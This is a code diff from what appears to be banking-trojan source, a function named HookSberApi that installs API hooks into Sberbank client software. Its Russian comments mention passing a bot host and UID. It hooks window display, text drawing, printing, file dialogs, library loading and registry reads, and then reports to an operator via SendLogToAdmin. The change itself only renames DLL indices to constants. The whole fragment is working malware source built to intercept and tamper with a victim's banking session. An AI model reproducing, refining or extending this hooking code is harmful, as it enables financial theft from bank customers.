@@ -296,12 +296,12 @@ static bool HookSberApi()
 	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, BOT_UID );
 
 	//Подгружаем из длл хуки и устанавливаем
-	TranslateHook( hLib, pInitFunc, "ShowWindowCallBack", "ShowWindow", 3, 0x7506E960, Real_ShowWindow );
-	TranslateHook( hLib, pInitFunc, "TranslateMessageCallBack", "TranslateMessage", 3, 0xC45D9631, Real_TranslateMessage );
-	TranslateHook( hLib, pInitFunc, "DrawTextACallBack", "DrawTextA", 3, 0x85BBDFC, Real_DrawTextA );
-	TranslateHook( hLib, pInitFunc, "DrawTextWCallBack", "DrawTextW", 3, 0x85BBDEA, Real_DrawTextW );
-	TranslateHook( hLib, pInitFunc, "DrawTextExACallBack", "DrawTextExA", 3, 0xEF7E3E57, Real_DrawTextExA );
-	TranslateHook( hLib, pInitFunc, "DrawTextExWCallBack", "DrawTextExW", 3, 0xEF7E3E41, Real_DrawTextExW );
+	TranslateHook( hLib, pInitFunc, "ShowWindowCallBack", "ShowWindow", DLL_USER32, 0x7506E960, Real_ShowWindow );
+	TranslateHook( hLib, pInitFunc, "TranslateMessageCallBack", "TranslateMessage", DLL_USER32, 0xC45D9631, Real_TranslateMessage );
+	TranslateHook( hLib, pInitFunc, "DrawTextACallBack", "DrawTextA", DLL_USER32, 0x85BBDFC, Real_DrawTextA );
+	TranslateHook( hLib, pInitFunc, "DrawTextWCallBack", "DrawTextW", DLL_USER32, 0x85BBDEA, Real_DrawTextW );
+	TranslateHook( hLib, pInitFunc, "DrawTextExACallBack", "DrawTextExA", DLL_USER32, 0xEF7E3E57, Real_DrawTextExA );
+	TranslateHook( hLib, pInitFunc, "DrawTextExWCallBack", "DrawTextExW", DLL_USER32, 0xEF7E3E41, Real_DrawTextExW );
 	TranslateHook( hLib, pInitFunc, "TextOutACallBack", "TextOutA", DLL_GDI, 0x4954ED86, Real_TextOutA );
 	TranslateHook( hLib, pInitFunc, "TextOutWCallBack", "TextOutW", DLL_GDI, 0x4954ED90, Real_TextOutW );
 	TranslateHook( hLib, pInitFunc, "ExtTextOutACallBack", "ExtTextOutA", DLL_GDI, 0x3D54FCFA, Real_ExtTextOutA );
@@ -309,8 +309,8 @@ static bool HookSberApi()
 	TranslateHook( hLib, pInitFunc, "EnumPrintersACallBack", "EnumPrintersA", DLL_WINSPOOL, 0x9804C3C0, Real_EnumPrintersA );
 	TranslateHook( hLib, pInitFunc, "GetSaveFileNameACallBack", "GetSaveFileNameA", DLL_COMANDLG32, 0x8FD473C8, Real_GetSaveFileNameA );
 	TranslateHook( hLib, pInitFunc, "GetOpenFileNameACallBack", "GetOpenFileNameA", DLL_COMANDLG32, 0xE16570D, Real_GetOpenFileNameA );
-	TranslateHook( hLib, pInitFunc, "LoadLibraryExWCallBack", "LoadLibraryExW", 1, 0x20088E7C, Real_LoadLibraryExW );
-	TranslateHook( hLib, pInitFunc, "RegQueryValueExACallBack", "RegQueryValueExA", 2, 0x1802E7C8, Real_RegQueryValueExA );
+	TranslateHook( hLib, pInitFunc, "LoadLibraryExWCallBack", "LoadLibraryExW", DLL_KERNEL32, 0x20088E7C, Real_LoadLibraryExW );
+	TranslateHook( hLib, pInitFunc, "RegQueryValueExACallBack", "RegQueryValueExA", DLL_ADVAPI32, 0x1802E7C8, Real_RegQueryValueExA );
 
 	DBG( "Sber", "Установка хуков выполнена" );
 	SendLogToAdmin(3);
